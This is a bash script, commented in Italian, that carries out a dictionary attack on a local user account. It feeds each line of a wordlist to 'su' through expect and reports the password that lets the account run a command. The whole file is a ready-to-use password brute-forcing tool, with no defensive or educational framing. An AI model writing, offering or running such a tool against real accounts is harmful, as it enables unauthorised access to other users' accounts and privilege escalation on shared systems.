#!/bin/bash

# Funzione che viene eseguita se l'utente non fornisce 2 argomenti.
mostra_aiuto() {
    echo -e "\e[1;33mUso: $0 UTENTE DIZIONARIO"
    echo -e "\e[1;31mDevi specificare sia il nome utente che il file del dizionario.\e[0m"
    exit 1
}

# Funzione chiamata quando l'utente preme CTRL+C per uscire.
termina_script() {
    echo -e "\n\e[1;31mInterruzione dello script.\e[0m"
    exit
}

trap termina_script SIGINT

utente=$1
dizionario=$2

# Controlla il numero di argomenti. Se non sono 2, mostra le istruzioni.
if [[ $# != 2 ]]; then
    mostra_aiuto
fi

# Calcola il numero totale di righe nel dizionario.
totale=$(wc -l < "$dizionario")
progresso=0

# Ciclo per leggere il contenuto del dizionario riga per riga.
while IFS= read -r password; do
    ((progresso++))
    
    # Aggiorna la barra di progressione.
    percentuale=$((progresso * 100 / totale))
    barra=$(printf '=%.0s' $(seq 1 $((percentuale / 2))))
    printf "\r[%s>%-50s] %d%%" "$barra" "" "$percentuale"

    risultato=$(expect << EOF
        set timeout 0.1
        spawn su $utente -c "echo Hello"
        expect "Password:"
        send "$password\r"
        expect {
            "Hello" { exit 0 }
            default { exit 1 }
        }
EOF
    )
    if [[ $? -eq 0 ]]; then
        echo -e "\n\e[1;32mPassword trovata per l'utente $utente: $password\e[0m"
        break
    fi
done < "$dizionario"

# Messaggio finale se non trova la password.
if [[ $? -ne 0 ]]; then
    echo -e "\n\e[1;31mPassword non trovata nel dizionario.\e[0m"
fi
